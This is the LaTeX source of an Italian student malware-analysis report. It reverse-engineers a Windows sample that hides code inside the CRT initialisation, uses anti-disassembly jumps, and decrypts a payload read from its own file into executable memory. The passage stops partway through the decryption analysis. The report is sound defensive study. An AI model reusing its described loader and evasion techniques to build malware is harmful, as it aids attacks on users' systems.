@@ -1,0 +1,3293 @@
+\documentclass[
+    a4paper, % foglio A4
+    11pt % grandezza del font di default
+]{article}
+\usepackage[
+    top=2cm, % margine superiore
+    bottom=2cm, % margine inferiore
+    left=1cm, % margine sinistro
+    right=1cm, % margine destro
+]{geometry}
+\usepackage[utf8]{inputenc}
+\usepackage[italian]{babel}
+\usepackage{graphicx}
+\usepackage{float}
+\usepackage{tikz}
+\usepackage{hyperref}
+\usepackage{listings}
+\usepackage{xcolor}
+
+\definecolor{codegreen}{rgb}{0,0.6,0}
+\definecolor{codegray}{rgb}{0.5,0.5,0.5}
+\definecolor{codepurple}{rgb}{0.58,0,0.82}
+\definecolor{backcolour}{rgb}{0.95,0.95,0.92}
+
+\lstdefinestyle{mystyle}{
+    backgroundcolor=\color{backcolour},   
+    commentstyle=\color{codegreen},
+    keywordstyle=\color{magenta},
+    numberstyle=\tiny\color{codegray},
+    stringstyle=\color{codepurple},
+    basicstyle=\ttfamily\footnotesize,
+    breakatwhitespace=false,         
+    breaklines=true,                 
+    captionpos=b,                    
+    keepspaces=true,                 
+    numbers=left,                    
+    numbersep=5pt,                  
+    showspaces=false,                
+    showstringspaces=false,
+    showtabs=false,                  
+    tabsize=2
+}
+
+\lstset{style=mystyle}
+
+\graphicspath{ {./images/} }
+
+\newcommand{\pic}[4]{\begin{figure}[H]
+            \centering
+            \includegraphics[width=#3, height=#4]{#1}
+            \caption{#2}
+            \label{fig:#1}
+            \end{figure}}
+
+\title{Analisi del Malware - progetto}
+\date{}
+\author{Stefano Belli}
+
+\begin{document}
+
+    \maketitle
+    
+    \tableofcontents
+
+    \section*{Obiettivo del documento}
+        Lo scopo è quello di illustrare le funzionalità offerte dal malware all'utente malintenzionato
+        tramite tecniche di RCE white, black e gray box. Ogni informazione dedotta è accompagnata da passaggi
+        dettagliati per arrivarci.
+
+    \pagebreak
+
+    \section{Passaggi preliminari}
+        Prima di iniziare a effettuare l'analisi del malware, potendo quest'ultimo provocare danni,
+        è stata creata una VM su hypervisor di tipo 2: VirtualBox. In questa VM vi è stata
+        installata una build di Windows 10. \\ L'antivirus della Microsoft installato di default
+        in Windows 10 è stato disattivato completamente. \\ Dato che il malware può provocare danni,
+        più cloni della VM sono stati creati, in modo da non dover rieffettuare il setup dell'ambiente
+        ogni volta.
+
+    \section{Contatto iniziale}
+        Una volta estratto, il file con estensione \textit{".e\_e"} è stato rinominato in \textit{".exe"}
+        si è tentata l'esecuzione diretta in VM ma il malware sembra non
+        avere alcun effetto apparente (ExitProcess immediata), 
+        anche provando a passare argomenti a caso 
+        modificando la cmdline del programma.
+
+        \pic{firstapproach}{Il malware non fa niente... (apparentemente)}{14cm}{5cm}
+
+        \subsection{Il programma non è protetto da packer}
+            Per determinare ciò, è stato prima eseguito PEiD che non mostra nulla di sospetto
+
+            \pic{nonpacker}{PEiD restituisce "Nothing found"}{14cm}{8cm}
+
+            Poi, PE-bear mostra dimensioni delle sezioni del file PE approssimativamente uguali alle
+            dimensioni delle corrispondenti pagine in memoria (VirtualSize $\approx$ RawSize)
+
+            \pic{samesizesapprox}{Colonne "Raw size" e "Virtual Size" simili}{9cm}{5cm}
+
+            PE studio sembra essere estremamente lento nell'analisi... non riesce a ricostruire gli imports
+
+            Ma provando con Dependency Walker e CFF explorer, è evidente come siano linkate dinamicamente
+            numerose librerie e da esse vengano poi utilizzate altrettante numerose funzioni:
+
+            \pic{lotsofdlls}{Le numerose DLLs linkate a sample.exe}{15cm}{9cm}
+
+            \pic{importsuser32}{Imports da user32.dll}{15cm}{7cm}
+            
+            Usando Ghidra, non si nota nulla di strano: codice eseguibile e dimensioni
+            delle sections nella norma.
+
+        \subsection{Stringhe estratte}
+            Forse queste stringhe potrebbero indicare una serie di opzioni che sample.exe prende in input
+            \pic{str_cmdline}{Comandi che sample.exe prende in pasto?}{6cm}{3cm}
+
+            Il programma sembra includere anche riferimenti ad alcune certificate authorities, forse si collega ad
+            internet? Utilizza TLS?
+            \pic{str_ca}{Certificate Authority (address)}{10cm}{3cm}
+            \pic{str_ca1}{Certificate Authority (cert. repo.)}{11cm}{2cm}
+
+            Il malware tenta forse di mascherarsi come un software NVIDIA?
+            \pic{str_nvidia}{NVIDIA}{10cm}{5cm}
+
+            Osservando le stringhe è evidente come il programma utilizzi la runtime C++ di Microsoft
+            (e quindi è stato scritto in C++, visibile sia perché è esplicitamente scritto, sia perchè sono
+            presenti operatori del C++ tipo \texttt{delete[]}, \texttt{new[]}, riferimenti a vtable, costruttori, distruttori,
+            e nomi delle funzioni strane per via del name mangling.
+
+            Per il resto non si riesce a comprendere molto altro (stringhe cifrate, cifrario/metodo e
+            chiave sconosciuti).
+
+        \subsection{Esecuzione in nuova VM, cattura eventi e regshot diff}
+            Dato che da questo "contatto iniziale" non abbiamo capito molto, proviamo prima di
+            procedere con i metodi "tosti", a eseguire il software su una macchina VM pulita e 
+            a vedere che succede usando procmon e regshot...
+
+            Nulla di strano, sembrano normali operazioni di iniziallizazione e poi teardown del processo:
+            \pic{procmon_load}{Caricamento dell'eseguibile in memoria}{12cm}{5cm}
+            \pic{procmon_furtherload}{Operazioni SO/CRT/init routines...}{10cm}{5cm}
+            \pic{procmon_furtherload2}{Ancora op. di init...}{10cm}{7cm}
+            \pic{procmon_cleanup}{Inizio terminazione del processo}{10cm}{3cm}
+            \pic{procmon_lastcleanup}{Completamento terminazione processo}{18cm}{5cm}
+
+            Cercando il filename dell'eseguibile lanciato nel diff di regshot non si nota
+            nulla di anormale, l'unica key che include "sample.exe" serve per ragioni di
+            compatibilità tra versioni di Windows:
+            
+            \texttt{...\textbackslash AppCompatFlags\textbackslash Compatibility 
+            Assistant\textbackslash Store\textbackslash  C:\textbackslash...\textbackslash sample.exe}
+            \pic{regshot_sampleexe}{Unica stringa "sample.exe" trovata nel diff di regshot}{14cm}{6cm}
+
+            Data \textbf{forse} la presenza di meccanismi anti-VM, non si riesce a dedurre molto sul
+            funzionamento del malware in quanto il suo processo termina immediatamente e le operazioni
+            svolte \textbf{sembrano} da routine di init. dell'immagine, init. prima dell'invocazione di 
+            main,... 
+            
+            Non si nota nulla di strano fino a qui (o comunque, non si riesce a capire cosa faccia il 
+            malware) e quindi bisogna procedere per forza con l'analisi
+            statica avanzata (disassembler interattivo, Ghidra)
+
+        \section{Analisi statica avanzata}
+            Usando Ghidra, cerchiamo di individuare una routine \texttt{main}, ci sono molteplici modi
+            per farlo, quello utilizzato in questo caso è seguire il flusso della routine di init
+            della C runtime di Microsoft fino a quando non si incontra l'inizio dell'ispezione
+            della command line per pushare gli argomenti a \texttt{main}, quali \texttt{argc} e
+            \texttt{argv} e quindi chiamare la \texttt{main} definita dall'utente.
+            \pic{entry}{Entry point di sample.exe}{9cm}{4cm}
+            Seguendo il secondo jump, \texttt{JMP \textunderscore\textunderscore tmainCRTStartup},
+            si arriva dopo poco a:
+            \pic{provide_main_args}{Parsing della cmdline, invocazione WinAPI}{12cm}{5cm}
+            Quindi, il flusso porta a del codice che pusha argomenti della \texttt{main} secondo calling
+            convention \texttt{\textunderscore\textunderscore stdcall}.
+            L'ultima push (corrispondente al primo argomento della funzione, secondo calling conv.) è la 
+            \texttt{HINSTANCE}, indirizzo prelevato dal valore associato al campo \texttt{ImageBase} nel PE header di sample.exe. Dato che 
+            è una costante hardcoded, è soggetta a possibile rilocazione nel caso in cui il SO decida
+            di caricare l'eseguibile in altro indirizzo di base (molto possibile data anche la 
+            presenza di meccanismi di sicurezza del kernel tipo ASLR).
+            \pic{afxwinmain_trampoline_call}{Push argomenti \texttt{main}}{14cm}{5cm}
+            Seguendo quindi la call (\texttt{CALL Trampoline\textunderscore AfxWinMain}):
+            \pic{afxwinmain_jmp}{Jump incondizionata}{15cm}{7cm}
+            Seguendo la jump (\texttt{JMP AfxWinMain}):
+            \pic{afxwinmain}{\texttt{AfxWinMain}}{14cm}{5cm}
+            Quindi, dato che questo prototipo della \texttt{main} è praticamente una funzione di init
+            del framework Microsoft MFC (C++) e non è del tutto comprensibile dal solo disassembler, 
+            conviene usare il debugger e impostare un breakpoint su \texttt{0x00470c8f}.
+            OllyDbg carica l'eseguibile con \texttt{ImageBase = 0x00400000}.
+
+            \subsection{Inizio analisi dinamica avanzata}
+            Settando il breakpoint su OllyDbg...
+            \pic{odbg1brkp}{Breakpoint settato}{16cm}{5cm}
+            Il programma termina ancora prima di raggiungere il breakpoint, quindi la \texttt{main} non 
+            viene mai raggiunta e del codice eseguibile prima di essa chiama \texttt{ExitProcess(code=0)}
+
+            Quindi, torniamo su Ghidra, poco prima c'era una \texttt{CALL}
+            che ricadeva nel mezzo di un'altra istruzione (tecnica per confondere l'analista che 
+            si ritrova con una call nel mezzo di un'altra istruzione) ovvero \texttt{CALL LAB\textunderscore004668c9+1}:
+            \pic{suspect_entry}{\texttt{CALL LAB\textunderscore004668c9+1}}{12.5cm}{4cm}
+            Ghidra indica la cross reference del salto nel mezzo dell'istruzione. Il flusso ripartirà quindi
+            dal byte eseguibile \texttt{7d fc 00 74 0a 8b \dots}, saltando il primo byte \texttt{83}
+            \pic{suspect_midinstr}{Jump nel byte \texttt{7d}}{12.5cm}{4cm}
+
+            \textbf{Proviamo a settare il breakpoint su \texttt{0045ee27} su OllyDbg}:
+            stesso risultato, terminazione del programma \underline{prima} del
+            raggiungimento del breakpoint.
+
+            \subsection{Analisi della call stack}
+            Immediatamente dopo la chiamata di \texttt{ExitProcess} da parte
+            del processo, quest'ultimo termina ma OllyDbg tiene traccia della
+            call stack del main thread per arrivare alla chiamata finale:
+            \pic{callstack}{Call stack del main thread}{13cm}{4.5cm}
+
+            \subsection{Ricostruire il call graph fino a \texttt{ExitProcess}}
+            Analizzando la call stack e usando Ghidra, il call graph parziale fino a ExitProcess è:
+
+            \begin{center}
+                \begin{tikzpicture}
+                    \node (A) at (-2,0) {\texttt{\textunderscore\textunderscore mtinit} @ \texttt{00463DD5}};
+                    \node (Aa) at (-2,-0.3) {\tiny{chiamato da \texttt{0045EDB4}}};
+                    \draw[->] (0,0) -- (2,0);
+                    \node (B) at (4.5, 0) {\texttt{UnnamedFun0} @ \texttt{0046644A}};
+                    \node (Bb) at (4.5,-0.3) {\tiny{chiamato da \texttt{00463F17}}};
+                    \draw[->] (6.8,0) -- (8.8, 0);
+                    \node (C) at (11.25, 0) {\texttt{UnknownCall0} @ \texttt{????????}};
+                    \node (Cc) at (11.25,-0.3) {\tiny{chiamato da \texttt{004664AF}}};
+                \end{tikzpicture}
+            \end{center}
+
+            L'ultima funzione chiamata non è nota a tempo di compilazione, infatti come possiamo vedere
+            da OllyDbg in figura \ref{fig:callstack}, la procedura chiamata (\texttt{00502B90}) in \texttt{0046644A} è in un indirizzo 
+            lontano rispetto a quest'ultima e in Ghidra non riusciamo proprio a raggiungere questi
+            indirizzi virtuali.
+
+            \pic{unk_call}{Indirizzo della call prelevato a runtime dallo stack}{13cm}{0.5cm}
+            
+            Comunque, una volta chiamata \texttt{00502B90} non se ne esce più, perchè prima
+            o poi viene chiamata \texttt{ExitProcess}, al suo interno.
+
+            Quindi, possiamo supporre un call graph completo dall'entry point dell'eseguibile PE fino a
+            \texttt{ExitProcess} come segue:
+
+            \begin{center}
+                \begin{tikzpicture}
+                    \node (U) at (-2,2) {\texttt{entry} @ \texttt{0045EEB2}};
+                    \node (Uu) at (-2,1.7) {\tiny{controllo passato dal SO}};
+                    \draw[->] (-0.2,2) -- (1.8,2);
+                    \node (W) at (4.7,2) {\texttt{\textunderscore\textunderscore tmainCRTStartup} @ \texttt{0045ED34}};
+                    \node (Ww) at (4.7,1.7) {\tiny{chiamato da \texttt{0045EEB7}}};
+                    \draw[->] (4.7,1.5) -- (-2,0.2);
+                    \node (A) at (-2,0) {\texttt{\textunderscore\textunderscore mtinit} @ \texttt{00463DD5}};
+                    \node (Aa) at (-2,-0.3) {\tiny{chiamato da \texttt{0045EDB4}}};
+                    \draw[->] (0,0) -- (2,0);
+                    \node[color=red] (B) at (4.5, 0) {\texttt{UnnamedFun0} @ \texttt{0046644A}};
+                    \node[color=red] (Bb) at (4.5,-0.3) {\tiny{chiamato da \texttt{00463F17}}};
+                    \draw[->] (6.8,0) -- (8.8, 0);
+                    \node (C) at (11.25, 0) {\texttt{UnknownCall0} @ \texttt{????????}};
+                    \node (Cc) at (11.25,-0.3) {\tiny{chiamato da \texttt{004664AF}}};
+                    \draw[->] (11.25, -0.5) -- (-2,-2.1);
+                    \node (D) at (-2, -2.4) {\Huge{\dots}};
+                    \draw[->] (-1.4, -2.4) -- (0.8, -2.4);
+                    \node (E) at (3.5, -2.4) {\texttt{ExitProcess!KERNEL32.dll}};
+                    \node (Ee) at (3.5, -2.7) {\tiny{chiamato da \texttt{???}}};
+                \end{tikzpicture}
+            \end{center}
+
+            \pic{mtinit_legit}{Riconoscimento dagli analizzatori di Ghidra}{15.5cm}{4.5cm}
+            
+            \texttt{UnnamedFun0} è in rosso perchè c'è da precisare che 
+            \texttt{\textunderscore\textunderscore mtinit} è una funzione
+            di iniziallizzazione legittima della C runtime (CRT) di Microsoft, però in un punto "non sensibile" all'interno di quest'ultima
+            (che quindi non ne compromette il funzionamento) viene inserito del codice extra malevolo
+            al fine di nascondersi meglio e far confondere l'analista. 
+            
+            In questo caso il codice malevolo
+            di cui si parla è la funzione che comincia all'indirizzo \texttt{0046644A} 
+            (\texttt{UnnamedFun0}), dalla quale non si riesce più a ritornare.
+
+            \subsection{Analisi di \texttt{UnnamedFun0} @ \texttt{0046644A} con Ghidra}
+
+            Dopo aver rinominato \texttt{UnnamedFun0} in \texttt{SuspectEntryPoint}, procediamo con la sua analisi:
+            Ghidra non riconosce alcun argomento per la funzione, nonostante le \texttt{push} prima della \texttt{call}
+            alla routine (quest'ultima non vi accede mai).
+            
+            \pic{suspectep_call}{Chiamata con passaggio di argomenti}{15cm}{3cm}
+
+            Andando nella funzione, tralasciando il setup dello stack frame e byte di padding/alignment,
+            individuiamo:
+
+            \pic{see_init}{Init delle variabili locali che conterranno puntatore e grandezza codice da eseguire}{15cm}{5cm}
+
+            Prima di invocare la funzione che alloca e copia codice eseguibile (ulteriore codice malevolo), gli viene passato il puntatore
+            alle variabili locali per settarle dopo aver copiato con successo il codice. Il nome delle variabili locali,
+            \texttt{malFunSize} e \texttt{malFunPtr} è auto-esplicativo.
+            
+            \pic{see_cemc}{In \texttt{CopyEncryptedMaliciousCode}, le var locali vengono settate tramite passaggio di ptr}
+            {12cm}{7cm}
+
+            \subsubsection{Analisi di \texttt{CopyEncryptedMaliciousCode}}
+
+            \pic{cemc_signature}{Signature di \texttt{CopyEncryptedMaliciousCode}}{19cm}{2cm}
+
+            Alla funzione serve la \texttt{ImageBase} "attuale" (del processo corrente)
+            \pic{cemc_getimagebase}{}{8cm}{3cm}
+
+            Dato che la funzione deve copiare del codice e lo deve fare da un file (come sarà evidente dopo),
+            alla stessa funzione serve sapere l'offset relativamente al file da dove inizia il codice e quanto è
+            grande in bytes. Queste informazioni sono reperibili (file offset e length) 
+            nel processo corrente agli indirizzi \texttt{ImageBase} + \texttt{0x3e0} e \texttt{ImageBase} + \texttt{0x3e4}.
+
+            \pic{cemc_offs}{Preleva dal processo corrente offset e size codice eseguibile}{17cm}{7cm}
+
+            Valori agli indirizzi del processo:
+
+            \pic{cemc_offs_data}{\texttt{ImageBase + 0x3e0} e \texttt{ImageBase + 0x3e4}}{12cm}{3cm}
+
+            Questi valori vengono memorizzati temporaneamente dereferenziando i puntatori passati come argomento a
+            
+            \texttt{CopyEncryptedMaliciousCode} (figura \ref{fig:cemc_signature}).
+
+            Poi vengono allocate memory pages (osservare i permessi 
+            \texttt{PAGE\textunderscore EXECUTE\textunderscore READWRITE}) 
+            per il codice eseguibile. 
+            
+            \texttt{*nBytesAddr} indica la grandezza in bytes del codice ovvero quanto prelevato prima
+            da \texttt{ImageBase + 0x3e4}.
+            
+            \pic{cemc_alloc}{\texttt{VirtualAlloc(NULL, *nBytesAddr, 
+            MEM\textunderscore COMMIT | MEM\textunderscore RESERVE,
+            PAGE\textunderscore EXECUTE\textunderscore READWRITE)}}{18cm}{8cm}
+
+            \pagebreak
+
+            Il malware scopre la sua path assoluta (dell'eseguibile caricato in memoria) nel filesystem:
+            \pic{cemc_path}{\texttt{GetModuleFileNameA(NULL, myAbsoluteExePath, 0x104)}}{15cm}{5cm}
+            A \texttt{GetModuleFileNameA} viene passato NULL (a indicare me stesso), l'indirizzo di una variabile sullo
+            stack (che conterrà la path assoluta al ritorno da \texttt{GetModuleFileNameA}) calcolato con \texttt{LEA}
+            (\texttt{0xfffffef8} Ghidra non ha riconosciuto il complemento a due, il numero è negativo) e la lunghezza
+            in bytes del buffer
+
+            Proseguendo, c'è evidente codice di invocazione della WinAPI \texttt{CreateFileA} che a discapito del nome
+            viene usata con la flag \texttt{OPEN\textunderscore EXISTING} 
+            che la riduce a apertura di un file già esistente, altrimenti restituisce erorre (non ne crea un altro):
+            \pic{cemc_openexisting}{\texttt{CreateFileA(myAbsoluteExePath, 
+            GENERIC\textunderscore READ, FILE\textunderscore SHARE\textunderscore READ, NULL, OPEN\textunderscore EXISTING, FILE\textunderscore ATTRIBUTE\textunderscore NORMAL, NULL)}}{18cm}{10cm}
+
+            La API restituisce un handle a un file aperto in sola lettura, con condivisione con altri processi abilitata
+            in lettura, il file DEVE ESISTERE. La path è quella nel buffer
+            popolato prima da \texttt{GetModuleFileNameA}: \texttt{myAbsoluteExePath}. Ovvero, viene aperto l'eseguibile
+            che ha fornito l'immagine al processo corrente, ovvero il malware "apre se stesso" (\texttt{...\textbackslash 
+            sample.exe})
+
+            \pagebreak
+
+            Da ora in poi c'è effettivo utilizzo dell'offset relativo al file prelevato in precedenza (dall'indirizzo virtuale del proc. corrente: \texttt{ImageBase + 0x3e0}) dalla funzione: il
+            file pointer del file appena aperto viene settato sul valore di quell'offset 
+            
+            Ricordiamo però che l'offset viene memorizzzato in \texttt{*fnPtrAddr} come variabile temporanea
+            (figura \ref{fig:cemc_offs}).
+            
+            \texttt{fnPtrAddr} è
+            una variabile passata come argomento alla funzione ed è di tipo \texttt{FunPtr *fnPtrAddr} (figura \ref{fig:cemc_signature})
+            
+            \pic{cemc_filepointer}{\texttt{SetFilePointer(myExeFileHandle, *fnPtrAddr, NULL, NULL)}}{17cm}{9cm}
+
+            Dopo aver spostato il file pointer, bisogna leggere il file da quel punto per \texttt{"*nBytesAddr"} bytes,
+            memorizzando quanto letto nel buffer allocato in precedenza da \texttt{VirtualAlloc}.
+
+            \pic{cemc_read}{\texttt{ReadFile(myExeFileHandle, buf, *nBytesAddr, NULL)}}{18cm}{10cm}
+
+            Infine, la fase finale è quella di ritorno alla funzione chiamante:
+
+            \pic{cemc_success}{\texttt{CopyEncryptedMaliciousCode} terminata con successo}{18cm}{9cm}
+
+            alla variabile puntata da \texttt{fnPtrAddr} viene assegnato l'inizio del buffer allocato da 
+            \texttt{VirtualAlloc} e poi, \texttt{nBytesAddr} (che è un \texttt{SIZE\_T *} passato alla funzione \texttt{CopyEncryptedMaliciousCode}, figura \ref{fig:cemc_signature}) contiene già la grandezza del codice eseguibile.
+
+            Ovviamente, ora come ora il codice non è in realtà eseguibile perchè criptato, ma settare da subito
+            i permessi delle pagine allocate come \texttt{PAGE\textunderscore EXECUTE\textunderscore READWRITE} permette di evitare di chiamare
+            dopo la \texttt{VirtualProtect}.
+
+            \subsubsection{\texttt{Get\textunderscore ImageBase\textunderscore FromPEB}}
+            Il codice per prelevare \texttt{ImageBase} è abbastanza semplice e autoesplicativo, riassunto nella caption
+            dell'immagine.
+            \pic{getimagebase}{\texttt{PEB* pebAddr = FS:[0x30]; return *((DWORD*)((BYTE*)pebAddr + 8));}}{18cm}{9cm}
+
+            \subsection{Torno a \texttt{SuspectEntryPoint}}
+
+            Proseguo dopo il ritorno di \texttt{CopyEncryptedMaliciousCode}, tralasciando le \texttt{cmp} di check
+            di condizione d'errore e la pulizia dello stack (\texttt{\textunderscore\textunderscore cdecl} 
+            call. conv. usata):
+
+            \pic{see_nextunkfn}{Funzioni sconosciute}{13cm}{3cm}
+
+            \subsubsection{Analisi di \texttt{FUN\textunderscore 004668BD}}
+
+            \pic{see_unkfn0_wrong}{Funzione disassemblata erroneamente da Ghidra}{11cm}{14cm}
+
+            Il disassembler non riesce a disassemblare correttamente le istruzioni perchè nel mezzo della 
+            funzione (\texttt{LAB\textunderscore 004668c9+1}), essa viene raggiunta da una jump da un altro punto del codice dell'eseguibile. Tra l'altro,
+            il codice che fa la jump, non viene mai raggiunto a causa dell'\texttt{ExitProcess} chiamata prima.
+            Potrebbe essere una tecnica anti-disasm. Per risolvere è sufficiente effettuare \textit{clear code bytes} e 
+            disassemblare secondo il flusso che osserviamo.
+
+            \pic{see_unkfn0_ok}{Funzione disassemblata correttamente}{12cm}{16cm}
+
+            La funzione è molto semplice, ri-ottiene \texttt{ImageBase} tramite la solita \texttt{Get\textunderscore ImageBase\textunderscore FromPEB}
+            e poi ritorna \texttt{ImageBase + 0x3f4}
+
+            \pagebreak
+            
+            \subsubsection{Analisi di \texttt{FUN\textunderscore 004668ED}}
+
+            Molto simile alla precedente, sta volta Ghidra riesce da subito a disassemblare correttamente la funzione,
+            quindi:
+            
+            \pic{see_unkfn1_ok}{}{12cm}{16cm}
+
+            La funzione ritorna \texttt{ImageBase + 0x3f0}. 
+            
+            In entrambe le funzioni:
+            \begin{itemize}
+                \item \texttt{Sum\textunderscore ImageBase\textunderscore To\textunderscore 0x3f0}
+                \item \texttt{Sum\textunderscore ImageBase\textunderscore To\textunderscore 0x3f4}
+            \end{itemize}
+
+            C'è del codice aggiuntivo che verifica che il valore restituito da \texttt{Get\textunderscore 
+            ImageBase\textunderscore FromPEB} 
+            sia diverso
+            da 0. 
+            Abbastanza inutile, almeno nelle edizioni di Windows più recenti il valore prelevato dalla \texttt{PEB}
+            relativo a \texttt{ImageBase}, offset +8, non può essere 0.
+
+            \subsection{Torno a \texttt{SuspectEntryPoint}}
+
+            \pic{see_nextunkfn_ok}{Nomi delle funzioni precedenti fixate}{10cm}{3cm}
+
+            Andando avanti, si trova una call preceduta da delle push. 
+            Le prime due mov compiono una dereference come scritta nel commento, quindi il valore della dereference
+            viene pushato come argomento della funzione sconosciuta.
+            Le due mov successive e quindi la push successiva a queste ultime due, fanno la stessa cosa (ovviamente con indirizzi diversi):
+
+            \pic{see_nextunkcall}{Chiamata a \texttt{FUN\textunderscore 004664BD} (sconosciuta) di 5 argomenti}
+            {13cm}{10cm}
+
+            \pagebreak
+            
+            \subsection{Analisi di \texttt{FUN\textunderscore 004664BD}}
+
+            Prima di procedere, avendo dato uno sguardo generale alla funzione, si determina facilmente come
+            Ghidra abbia interpretato erroneamente la funzione:
+
+            data questa jump, che Ghidra interpreta come se fosse una \texttt{call}...
+            \pic{unk_dec_jmp}{Jump incondizionata}{10cm}{5cm}
+
+            \dots interpreta una istruzione come una funzione (\texttt{FUN\_00466583}) all'interno di \texttt{FUN\_004664BD} (la prima, tra le altre cose osservare come la cross
+            reference sia una sola e rimandi alla stessa jump)
+            \pic{unk_fn_interp}{Interpretazione funzioni errata di Ghidra}{19.5cm}{10cm}
+
+            La seconda funzione (\texttt{FUN\_00466586}) è anch'essa molto improbabile che lo sia: sta nel
+            mezzo di \texttt{FUN\_004664BD} e non comincia con prologo di funzione. Sono state sparse qua e la delle
+            \texttt{call} a \texttt{FUN\_00466586} nel codice di iniziallizazione della CRT (oss. le numerose cross-references) e questo porta Ghidra a 
+            pensare che da \texttt{00466586} inizi una funzione (tecniche anti-disasm)
+
+            \pagebreak
+            
+            \subsubsection{Fixing interpretazione funzioni erronea di Ghidra}
+            
+            Sarà sufficiente eseguire tasto destro $\rightarrow$ Function $\rightarrow$ Delete Function 
+            sulle funzioni. 
+            
+            Ghidrà terrà comunque
+            conto delle cross references sull'indirizzo di inizio della funzione ma non verrà più 
+            interpretata come tale.
+            
+            Rimangono comunque segnalate come subroutine e questo può essere di intralcio, quindi si risolvono entrambi questi ultimi due problemi come segue:
+
+            \begin{enumerate}
+                \item Per la prima funzione, bisogna fixare l'interpretazione della \texttt{jmp} che Ghidra riconosce 
+                come \texttt{CALL\textunderscore RETURN} (figura \ref{fig:unk_dec_jmp}) 
+                ma in realtà è un semplice salto per loop
+                \pic{branch}{Scelta default instruction flow}{15cm}{5cm}
+
+                \item Per la seconda funzione (\texttt{FUN\_00466586}, figura \ref{fig:unk_fn_interp}), basta saltare sulle XREFS (su ogni XREF) evidenziate per essa e sulle 
+                singole \texttt{call} alla funzione \texttt{FUN\_00466586} eseguire \textit{clear code bytes}
+                \pic{clearcodebytes_call}{Era presente \texttt{CALL FUN\textunderscore 00466586}}{8cm}{3cm}
+            \end{enumerate}
+            A correzione completata, questo è il risultato:
+            \pic{fixing_ghidra_interp}{Interpretzione corretta, in particolare agli indirizzi virtuali \texttt{00466583} e \texttt{00466583}}{19cm}{6cm}
+
+            \subsection{Tornando a \texttt{FUN\textunderscore 004664BD}}
+            Osservando il \underline{decompilato}, è evidente come sia una routine di decifratura...
+            \pic{partof_decrypt}{Porzione di codice del decompilato della funzione}{16cm}{5cm}
+            
+            ...quindi in accordo a questo fatto e agli argomenti passati (vedendo sopra le 
+            \texttt{push} e poi la chiamata in figura \ref{fig:see_nextunkcall}), si modifica la signature di funzione:
+
+            \pic{change_signature}{Cambio signature su Ghidra}{19cm}{2.5cm}
+
+            \subsubsection{Suddivisione in macrofasi}
+            
+            \textbf{\underline{Allocazione dei buffer di appoggio}}
+            \pic{dec_allocbufs}{Buffer di appoggio}{13cm}{5cm}
+
+            \pagebreak
+            \textbf{\underline{Init dei buffer di appoggio}}
+            \pic{dec_init}{Init buffer di appoggio}{13cm}{5cm}
+
+            \textbf{\underline{Setup buffer di appoggio con "chiavi"}}
+            \pic{dec_key_setup}{Setup buffer di appoggio}{11cm}{4cm}
+
+            \textbf{\underline{Scramble (swap) buffer di appoggio}}
+            \pic{dec_key_swap}{Swap buffer di appoggio}{15cm}{3cm}
+
+            \textbf{\underline{Decryption del codice eseguibile direttamente}}
+            \pic{dec_decrypt_inplace}{Decryption codice eseguibile}{14cm}{5cm}
+
+            \textbf{\underline{Deallocazione dei buffer di appoggio e ritorno}}
+            \pic{dec_cleanup}{Deallocazione dei buffer di appoggio}{10cm}{3.5cm}
+
+            \subsubsection{Perfezionamento del decompilato e breve descrizione}
+
+            Le due chiavi pushate come argomenti alla funzione (prelevati con le stesse modalità del file
+            offset e size del codice eseguibile) hanno valore:
+
+            \pic{keypartreads}{Valori letti e poi pushati come argomenti alla funzione decifrante}
+            {12cm}{3cm}
+
+            Vengono denominati \texttt{keyBuf} e \texttt{keyStreamBuf} perchè il \texttt{keyStreamBuf}
+            è quello generato a partire dalla chiave originale tramite una serie di passaggi e che poi 
+            verrà usato nello XOR. Sia \texttt{keyBuf} che \texttt{keyStreamBuf} sono di grandezza 
+            \texttt{0x100} bytes e vengono iniziallizzati da \texttt{HeapAlloc} con flag 
+            \texttt{HEAP\textunderscore ZERO\textunderscore MEMORY}
+            \pic{dec_allocbufs_new}{Allocazione dei buffer}{13cm}{5cm}
+
+            \pagebreak
+            
+            Nell'init dei buffer, l'ultimo \texttt{for} risulta essere ridondante: \texttt{keyBuf}
+            era stato già iniziallizato interamente a 0
+            \pic{dec_init_new}{Iniziallizzazione dei buffer}{15cm}{7cm}
+
+            Dopo questa parte di procedura (figura \ref{fig:dec_key_setup_new}), \texttt{keyBuf} avrà i primi 8 elementi, (ciascuno da 1 byte)
+            popolati dai byte della chiave, in ordine inverso: il \texttt{\% 0x100} è come se fosse una \texttt{\& 
+            0xff} e lo shift a destra di 8 bit permette di passare al prossimo byte della chiave.
+            Quindi l'ultimo byte (inteso come quello LSB) della chiave sarà il primo del \texttt{keyBuf}:
+            conosciamo \texttt{keyPartAt3f0 = 0x770172b8} e \texttt{keyPartAt3f4 = 0x21f67f71} e allora
+            è possibile determinare i primi 8 elementi di \texttt{keyBuf}:
+
+            \begin{center}
+            \texttt{keyBuf[0] = 0x71}
+            
+            \texttt{keyBuf[1] = 0x7f}
+            
+            \texttt{keyBuf[2] = 0xf6}
+            
+            \texttt{keyBuf[3] = 0x21}
+            
+            \texttt{keyBuf[4] = 0xb8}
+            
+            \texttt{keyBuf[5] = 0x72}
+            
+            \texttt{keyBuf[6] = 0x01}
+            
+            \texttt{keyBuf[7] = 0x77}
+
+            \texttt{keyBuf[8] = 0x00}
+
+            \texttt{keyBuf[9] = 0x00}
+            
+            $\vdots$
+            
+            \end{center}
+            
+            \pic{dec_key_setup_new}{Setup del \texttt{keyBuf} per la chiave}{12cm}{5cm}
+
+            \pagebreak
+            
+            Forma di scrambling e generazione del keystream per la decrittazione (figura \ref{fig:dec_key_swap_new}), basato su 
+            \texttt{keyBuf} e swap elementi. Il cast \texttt{(uint)keyBuf[\textunderscore 
+            idx\textunderscore 1]}
+            è presente perchè la corrispondente istruzione assembly è
+            \texttt{ADD ECX, dword ptr[ EBP - 0x10]} e quindi vengono letti 4 byte dal \texttt{keyBuf}
+            a partire da una certa posizione, invece che uno solo, come da specifico datatype dell'array. 
+            Il \texttt{\% 0x100} permette di ottenere un singolo byte
+            su tutta la somma \texttt{(keyStreamBuf[\textunderscore idx\textunderscore 1] + 
+            \textunderscore idxSwap + (uint)keyBuf[\textunderscore idx\textunderscore 1])}.
+            \underline{Tutto} il \texttt{keyStreamBuf} viene popolato.
+            
+            \pic{dec_key_swap_new}{Swap elementi \texttt{keyStreamBuf}}{13cm}{3cm}
+
+            La prima parte del codice per la decifratura è simile alla parte precedente.
+            
